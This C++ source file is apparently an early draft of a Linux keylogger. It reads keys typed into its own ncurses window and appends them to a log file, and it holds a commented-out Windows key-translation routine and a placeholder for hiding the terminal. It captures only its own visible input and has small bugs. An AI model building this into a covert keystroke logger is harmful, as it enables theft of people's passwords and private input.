#include <iostream>
#include <iostream>
#include <fstream>
#include <ncurses.h>
#include <bits/stdc++.h>

//Log file path
#define LOG_FILE "keylogger.txt"

//Save data to file
void saveData(std::string data){
	std::fstream keylog;
	keylog.open(LOG_FILE, std::ios::app); //Append to file so logs are not cleared
	keylog << data;
	keylog.close();	
}

/*
//Translate special characters. Only works for Windows now
std::string translateKey(int key){
	std::string result;

	switch (key) {
	case VK_SPACE:
		result = " ";
		break;
	case VK_RETURN:
		result = "\n";
		break;
	case VK_BACK:
		result = "\b";
		break;
	case VK_CAPITAL:
		result = "[CAPS_LOCK]";
		break;
	case VK_SHIFT:
		result = "[SHIFT]";
		break;
	case VK_TAB:
		result = "\t";
		break;
	case VK_CONTOL:
		result = "[CTRL]";
		break;
	case VK_MENU:
		result = "[ALT]";
		break;
	default:
		break;
	}

	return result;
}
*/


int main (void){
	//Hide terminal
	
	
	//Initalise ncurses
	initscr();
	keypad(stdscr, true);
	noecho();

	std::cout << "Hello Linux" << std::endl;

	char key;
	while(true) {
		key = getch();
		printw("Key pressed: %c\n", key);
		saveData(std::string(1, key));
		refresh();
	}

	endwin();
	return 0;
}
